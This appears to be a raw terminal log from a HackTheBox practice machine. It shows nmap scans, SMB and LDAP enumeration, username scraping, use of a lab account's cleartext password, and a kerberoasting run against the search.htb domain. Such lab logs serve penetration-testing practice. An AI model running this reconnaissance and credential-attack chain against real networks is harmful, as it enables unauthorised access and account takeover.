@@ -1,0 +1,1141 @@
+
+=== SESSION START: 2026-09-13 20:30:55 | Box: Search | IP: 10.129.229.57 | Platform: HackTheBox ===
+
+$ [20:30:59] htblog
+
+=== OUTPUT CAPTURE START: 2026-09-13 20:30:59 ===
+
+$ [20:31:26] nmap -Pn -n -p- --min-rate 2000 -T4 -oA $BoxDir/nmap/allports $BoxIP
+
+$ [20:31:31] sudo nmap -Pn -n -p- --min-rate 2000 -T4 -oA $BoxDir/nmap/allports $BoxIP
+
+$ [20:34:24] nmap -Pn -n -sC -sV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 -oA $BoxDir/nmap/services $BoxIP
+Script started on 2026-09-13 20:30:59+01:00 [COMMAND="zsh -il" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="80" LINES="24"]
+%                                                                                ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:30:59] $ =kali@kali:~/Platforms/HackTheBox/Search [20:31:24] $ nmap -Pn -n -p- --min-rate 2000 -T4 -oA $BoxDir/nmap/allports $BoxIPnmap>
+]133;C\Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-13 20:31 +0100
+Couldn't open a raw socket. Error: (1) Operation not permitted
+Couldn't open a raw socket or eth handle.
+QUITTING!
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:31:26] $ =sssususudsuddosudoo o !!!!!!>
+sudo nmap -Pn -n -p- --min-rate 2000 -T4 -oA $BoxDir/nmap/allports $BoxIP
+]133;C\[sudo] password for kali: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-13 20:31 +0100
+Nmap scan report for 10.129.229.57
+Host is up (0.016s latency).
+Not shown: 65513 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+8172/tcp  open  unknown
+9389/tcp  open  adws
+49667/tcp open  unknown
+49691/tcp open  unknown
+49692/tcp open  unknown
+49708/tcp open  unknown
+49717/tcp open  unknown
+49743/tcp open  unknown
+50070/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 65.78 seconds
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:32:39] $ =nmap -Pn -n -sC -sV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 -oA $BoxDir/nmap/services $BoxIPnmap>
+]133;C\Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-13 20:34 +0100
+Couldn't open a raw socket. Error: (1) Operation not permitted
+Couldn't open a raw socket or eth handle.
+QUITTING!
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:34:24] $ =sssudo nmap -Pn -n -p- --min-rate 2000 -T4 -oA $BoxDir/nmap/allports $BoxIPsususudsuddosudoo o[3
+$ [20:34:30] sudo nmap -Pn -n -sC -sV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 -oA $BoxDir/nmap/services $BoxIP
+
+$ [20:38:12] boxset Domain search.htb
+9m !!!!!!>sudo nmap -Pn -n -sC -sV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 -oA $BoxDir/nmap/services $BoxIP
+]133;C\Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-13 20:34 +0100
+Nmap scan report for 10.129.229.57
+Host is up (0.016s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Search &mdash; Just Testing IIS
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-13 19:34:36Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-09-13T19:36:28+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+|_ssl-date: 2026-09-13T19:36:28+00:00; 0s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_http-server-header: Microsoft-IIS/10.0
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-09-13T19:36:28+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-09-13T19:36:28+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-09-13T19:36:28+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+8172/tcp open  ssl/unknown
+| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
+| Not valid before: 2020-04-07T09:05:25
+|_Not valid after:  2030-04-05T09:05:25
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_ssl-date: 2026-09-13T19:36:28+00:00; 0s from scanner time.
+9389/tcp open  mc-nmf        .NET Message Framing
+Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-09-13T19:35:23
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 118.31 seconds
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:36:28] $ =boxset Domain search.htbboxset>
+]133;C\[+] Domain=search.htb (saved to .env)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/Hack
+$ [20:38:31] netexec smb $BoxIP
+
+$ [20:39:23] netexec smb $BoxIP --shares -u '' -p ''
+
+$ [20:39:41] curl -si http://$BoxIP | head -30
+
+$ [20:40:19] firefox http://$BoxIP &
+TheBox/Search [20:38:12] $ =netexec smb $BoxIPnetexec>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:38:32] $ =netexec smb $BoxIP --shares -u '' -p ''netexec''''>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\: 
+SMB         10.129.229.57   445    RESEARCH         [-] Error enumerating shares: STATUS_ACCESS_DENIED
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:39:25] $ =curl -si http://$BoxIP | head -30curlhead>
+]133;C\HTTP/1.1 200 OK
+Content-Type: text/html
+Last-Modified: Tue, 11 Aug 2020 10:13:04 GMT
+Accept-Ranges: bytes
+ETag: "5f3800c86fd61:0"
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+Date: Sun, 13 Sep 2026 19:39:40 GMT
+Content-Length: 44982
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Search &mdash; Just Testing IIS</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    
+    
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,700" rel="stylesheet">
+    <link rel="stylesheet" href="fonts/icomoon/style.css">
+
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/jquery-ui.css">
+    <link rel="stylesheet" href="css/owl.carousel.min.css">
+    <link rel="stylesheet" href="css/owl.theme.default.min.css">
+    <link rel="stylesheet" href="css/owl.theme.default.min.css">
+
+    <link rel="stylesheet" href="css/jquery.fancybox.min.css">
+
+    <link rel="stylesheet" href="css/bootstrap-datepicker.css">
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:39:41] $ =firefox http://$BoxIP &firefox>
+]133;C\[1] 277588
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:40:19] $ =
+[1]  + done       firefox http://$BoxIP
+$ [20:42:21] curl -s http://$BoxIP | grep -oP '(?<=<h3 class="mb-2">)[^<]+' | tee $BoxDir/loot/names-raw.txt
+
+$ [20:42:41] curl -s http://$BoxIP | grep -i -A2 "team\|staff\|person\|employee" | head -40
+
+$ [20:43:05] curl -s http://$BoxIP | grep -A5 'class="p-3"' | grep -oP '(?<=<h3>)[^<]+'
+Cgrep'(?<=<h3 class="mb-2">)[^<]+'tee>
+]133;C\%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:42:21] $ =curl -s http://$BoxIP | grep -i -A2 "team\|staff\|person\|employee" | head -40curlgrep"team\|staff\|person\|employee"head>
+]133;C\                    <li><a href="#team-section" class="nav-link">Team</a></li>
+                    <li><a href="#pricing-section" class="nav-link">Pricing</a></li>
+                    <li><a href="#faq-section" class="nav-link">FAQ</a></li>
+--
+    <section class="site-section border-bottom" id="team-section">
+      <div class="container">
+        <div class="row mb-5 justify-content-center">
+--
+            <h2 class="section-title mb-3" data-aos="fade-up" data-aos-delay="">Our Team</h2>
+            <p class="lead" data-aos="fade-up" data-aos-delay="100">Lorem ipsum dolor sit amet consectetur adipisicing elit. Minus minima neque tempora reiciendis.</p>
+          </div>
+--
+            <div class="team-member">
+              <figure>
+                <ul class="social">
+--
+                <img src="images/person_5.jpg" alt="Image" class="img-fluid">
+              </figure>
+              <div class="p-3">
+--
+            <div class="team-member">
+              <figure>
+                <ul class="social">
+--
+                <img src="images/person_6.jpg" alt="Image" class="img-fluid">
+              </figure>
+              <div class="p-3">
+--
+            <div class="team-member">
+              <figure>
+                <ul class="social">
+--
+                <img src="images/person_7.jpg" alt="Image" class="img-fluid">
+              </figure>
+              <div class="p-3">
+--
+            <div class="team-member">
+              <figure>
+                <ul class="social">
+--
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:42:41] $ =curl -s http://$BoxIP | grep -A5 'class="p-3"' | grep -oP '(?<=<h3>)[^<]+'curlgrep'class="p-3"'grep'(?<=<h3>)[^<]+'>
+]133;C\Keely Lyons
+Dax Santiago
+Sierra Frye
+Kyla Stewart
+Kaiara Spencer
+Dave Simpson
+Ben Thompson
+Chris Stewart
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:43:05] $ =curl -s http://$BoxIP | grep -A5 'class="p-3"' | grep -oP '(?<=<h3>)[^<]+' | tee $BoxDir/loot/names-raw.txtcurlgrep'class="p-3"'[
+$ [20:43:22] curl -s http://$BoxIP | grep -A5 'class="p-3"' | grep -oP '(?<=<h3>)[^<]+' | tee $BoxDir/loot/names-raw.txt
+
+$ [20:43:59] curl -si http://$BoxIP/staff
+
+$ [20:44:23] curl -si http://$BoxIP/certsrv
+3Cgrep'(?<=<h3>)[^<]+'tee>
+]133;C\Keely Lyons
+Dax Santiago
+Sierra Frye
+Kyla Stewart
+Kaiara Spencer
+Dave Simpson
+Ben Thompson
+Chris Stewart
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:43:22] $ =curl -si http://$BoxIP/staffcurl>
+]133;C\HTTP/1.1 403 Forbidden
+Content-Type: text/html
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+Date: Sun, 13 Sep 2026 19:43:59 GMT
+Content-Length: 1233
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
+<title>403 - Forbidden: Access is denied.</title>
+<style type="text/css">
+<!--
+body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
+fieldset{padding:0 15px 10px 15px;} 
+h1{font-size:2.4em;margin:0;color:#FFF;}
+h2{font-size:1.7em;margin:0;color:#CC0000;} 
+h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
+#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
+background-color:#555555;}
+#content{margin:0 0 0 2%;position:relative;}
+.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
+-->
+</style>
+</head>
+<body>
+<div id="header"><h1>Server Error</h1></div>
+<div id="content">
+ <div class="content-container"><fieldset>
+  <h2>403 - Forbidden: Access is denied.</h2>
+  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
+ </fieldset></div>
+</div>
+</body>
+</html>
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:43:59] $ =curl -si http://$BoxIP/certsrvcurl>
+]133;C\HTTP/1.1 401 Unauthorized
+Content-Type: text/html
+Server: Microsoft-IIS/10.0
+WWW-Authenticate: Negotiate
+WWW-Authenticate: NTLM
+X-Powered-By: ASP.NET
+Date: Sun, 13 Sep 2026 19:44:22 GMT
+Content-Length: 1293
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
+<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
+<style type="text/css">
+<!--
+body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
+fieldset{padding:0 15px 10px 15px;} 
+h1{font-size:2.4em;margin:0;color:#FFF;}
+h2{font-size:1.7em;margin:0;color:#CC0000;} 
+h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
+#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
+background-color:#555555;}
+#content{margin:0 0 0 2%;position:relative;}
+.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
+-->
+</style>
+</head>
+<body>
+<div id="header"><h1>Server Error</h1></div>
+<div id="content">
+ <div class="content-container"><fieldset>
+  <h2>401 - Unauthorized: Acces
+$ [20:45:32] wget -q -r -l1 -nd -P $BoxDir/loot/images -A jpg,png,gif http://$BoxIP/images/
+
+$ [20:45:49] ls $BoxDir/loot/images/
+
+$ [20:46:03] curl -s http://$BoxIP | grep -oP 'images/[^"]+\.(jpg|png|gif)' | sort -u
+
+$ [20:46:21] mkdir -p $BoxDir/loot/images && curl -s http://$BoxIP | grep -oP 'images/[^"]+\.(jpg|png|gif)' | sort -u | while read img; do curl -s http://$BoxIP/$img -o $BoxDir/loot/images/$(basename $img); done && ls $BoxDir/loot/images/
+s is denied due to invalid credentials.</h2>
+  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
+ </fieldset></div>
+</div>
+</body>
+</html>
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:44:23] $ =wget -q -r -l1 -nd -P $BoxDir/loot/images -A jpg,png,gif http://$BoxIP/images/wget>
+]133;C\%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:45:32] $ =ls $BoxDir/loot/images/ls>
+]133;C\ls: cannot access '/home/kali/Platforms/HackTheBox/Search/loot/images/': No such file or directory
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:45:49] $ =curl -s http://$BoxIP | grep -oP 'images/[^"]+\.(jpg|png|gif)' | sort -ucurlgrep'images/[^"]+\.(jpg|png|gif)'sort>
+]133;C\images/about_1.jpg
+images/hero_1.jpg
+images/hero_2.jpg
+images/img_10.jpg
+images/img_11.jpg
+images/img_12.jpg
+images/img_13.jpg
+images/img_1.jpg
+images/img_2.jpg
+images/img_3.jpg
+images/img_4.jpg
+images/img_5.jpg
+images/img_6.jpg
+images/img_7.jpg
+images/img_8.jpg
+images/img_9.jpg
+images/person_1.jpg
+images/person_2.jpg
+images/person_3.jpg
+images/person_4.jpg
+images/person_5.jpg
+images/person_6.jpg
+images/person_7.jpg
+images/person_8.jpg
+images/slide_1.jpg
+images/slide_2.jpg
+images/slide_3.jpg
+images/slide_4.jpg
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:46:03] $ =mkdir -p $BoxDir/loot/images && curl -s http://$BoxIP | grep -oP 'images/[^"]+\.(jpg|png|gif)' | sort -u | while read img; do curl -s http://$BoxIP/$img -o $BoxDir/loot/images/$(basename $img); done && ls $BoxDir/loot/images/mkdircurlgrep'images/[^"]+\.(jpg|png|gif)'sortwhile readdo curl$(basename)donels>
+]133;C\about_1.jpg  img_11.jpg  img_2.jpg  img_6.jpg  person_1.jpg  person_5.jpg  slide_1.jpg
+hero_1.jpg   img_12.jpg  img_3.jpg  img_7.jpg  person_2.jpg  person_6.jpg  slide_2.jpg
+hero_2.jpg   img_13.jpg  img_4.jpg  img_8.jpg  person_3.jpg  person_7.jpg  slide_3.jpg
+img_10.jpg   img_1.jpg	 img_5.jpg  
+=== SESSION RECONNECT: 2026-09-13 20:48:52 ===
+
+$ [20:49:25] boxset Username hope.sharp
+boxset Password 'IsolationIsKey?'
+
+$ [20:50:36] netexec smb $BoxIP -u $Username -p $Password
+
+$ [20:51:22] netexec smb $BoxIP -u $Username -p $Password --shares
+img_9.jpg  person_4.jpg  person_8.jpg  slide_4.jpg
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:46:23] $ =boxset Username hope.sharp
+boxset Password 'IsolationIsKey?'boxsetboxset'IsolationIsKey?'>
+]133;C\[+] Username=hope.sharp (saved to .env)
+[+] Password=IsolationIsKey? (saved to .env)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:49:25] $ =netexec smb $BoxIP -u $Username -p $Passwordnetexec>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:50:37] $ =netexec smb $BoxIP -u $Username -p $Password --sharesnetexec>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
+SMB         10.129.229.57   445    RESEARCH         [*] Enumerated shares
+SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
+SMB         10.129.229.57   445    RESEARCH         -----           -----------     ------
+SMB         10.129.229.57   445    RESEARCH         ADMIN$                          Remote Admin
+SMB         10.129.229.57   445    RESEARCH         C$                              Default share
+SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.229.57   445    RESEARCH         helpdesk                        
+SMB         10.129.229.57   445    RESEARCH         IPC$            READ            Remote IPC
+SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share 
+SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRITE      
+SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share 
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali
+$ [20:53:01] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username%$Password -c "ls"
+
+$ [20:55:52] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username%$Password -c "ls" | awk 'NR>2 && $1 !~ /^\.$|^\.\.$|blocks/ {print $1}' | tee $BoxDir/loot/usernames.txt
+:~/Platforms/HackTheBox/Search [20:51:24] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username%$Password -c "ls"smbclient"ls">
+]133;C\  .                                  Dc        0  Sun Sep 13 20:51:23 2026
+  ..                                 Dc        0  Sun Sep 13 20:51:23 2026
+  abril.suarez                       Dc        0  Tue Apr  7 19:12:58 2020
+  Angie.Duffy                        Dc        0  Fri Jul 31 14:11:32 2020
+  Antony.Russo                       Dc        0  Fri Jul 31 13:35:32 2020
+  belen.compton                      Dc        0  Tue Apr  7 19:32:31 2020
+  Cameron.Melendez                   Dc        0  Fri Jul 31 13:37:36 2020
+  chanel.bell                        Dc        0  Tue Apr  7 19:15:09 2020
+  Claudia.Pugh                       Dc        0  Fri Jul 31 14:09:08 2020
+  Cortez.Hickman                     Dc        0  Fri Jul 31 13:02:04 2020
+  dax.santiago                       Dc        0  Tue Apr  7 19:20:08 2020
+  Eddie.Stevens                      Dc        0  Fri Jul 31 12:55:34 2020
+  edgar.jacobs                       Dc        0  Thu Apr  9 21:04:11 2020
+  Edith.Walls                        Dc        0  Fri Jul 31 13:39:50 2020
+  eve.galvan                         Dc        0  Tue Apr  7 19:23:13 2020
+  frederick.cuevas                   Dc        0  Tue Apr  7 19:29:22 2020
+  hope.sharp                         Dc        0  Thu Apr  9 15:34:41 2020
+  jayla.roberts                      Dc        0  Tue Apr  7 19:07:00 2020
+  Jordan.Gregory                     Dc        0  Fri Jul 31 14:01:06 2020
+  payton.harmon                      Dc        0  Thu Apr  9 21:11:39 2020
+  Reginald.Morton                    Dc        0  Fri Jul 31 12:44:32 2020
+  santino.benjamin                   Dc        0  Tue Apr  7 19:10:25 2020
+  Savanah.Velazquez                  Dc        0  Fri Jul 31 13:21:42 2020
+  sierra.frye                        Dc        0  Thu Nov 18 01:01:46 2021
+  trace.ryan                         Dc        0  Thu Apr  9 21:14:26 2020
+
+		3246079 blocks of size 4096. 764732 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:53:01] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username%$Password -c "ls" | awk 'NR>2 && $1 !~ /^\.$|^\.\.$|blocks/ {print $1}' | tee $BoxDir/loot/usernames.txtsmbclient"ls"awk 'NR>2 && $1 !~ /^\.$|^\.\.$|blocks/ {print $1}'tee>
+]133;C\abril.suarez
+Angie.Duffy
+Antony.Russo
+belen.compton
+Cameron.Melendez
+chanel.bell
+Claudia.Pugh
+Cortez.Hickman
+dax.santiago
+Eddie.Stevens
+edgar.jacobs
+Edith.Walls
+eve.galvan
+frederick.cuevas
+hope.sharp
+jayla.roberts
+Jordan.Gregory
+payton.harmon
+Reginald.Morton
+santino.benjamin
+Savanah.Velazquez
+sierra.frye
+trace.ryan
+
+3246079
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:55:52] $ =netexec ldap $BoxIP -u $Username -p $Password --kerberoasting $BoxDir/loot/kerberoast.txtne
+$ [20:56:28] netexec ldap $BoxIP -u $Username -p $Password --kerberoasting $BoxDir/loot/kerberoast.txt
+
+$ [20:56:56] echo "$BoxIP $Domain" | sudo tee -a /etc/hosts
+
+$ [20:57:17] netexec ldap $BoxIP -u $Username -p $Password --kerberoasting $BoxDir/loot/kerberoast.txt
+texec>
+]133;C\LDAP        10.129.229.57   389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.229.57   389    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
+LDAP        10.129.229.57   389    RESEARCH         [*] Skipping disabled account: krbtgt
+LDAP        10.129.229.57   389    RESEARCH         [*] Total of records returned 1
+LDAP        10.129.229.57   389    RESEARCH         [-] Some other OSError occured: [Errno Connection error (SEARCH.HTB:88)] [Errno -2] Name or service not known
+LDAP        10.129.229.57   389    RESEARCH         [-] Error retrieving TGT for search.htb\hope.sharp from None
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:56:29] $ =echo "$BoxIP $Domain" | sudo tee -a /etc/hostsecho "$BoxIP $Domain"sudo tee/etc/hosts>
+]133;C\[sudo] password for kali: 
+10.129.229.57 search.htb
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:56:59] $ =netexec ldap $BoxIP -u $Username -p $Password --kerberoasting $BoxDir/loot/kerberoast.txtnetexec>
+]133;C\LDAP        10.129.229.57   389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.229.57   389    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
+LDAP        10.129.229.57   389    RESEARCH         [*] Skipping disabled account: krbtgt
+LDAP        10.129.229.57   389    RESEARCH         [*] Total of records returned 1
+LDAP        10.129.229.57   389    RESEARCH         [*] sAMAccountName: web_svc, memberOf: [], pwdLastSet: 2020-04-09 13:59:11.329031, lastLogon: <never>
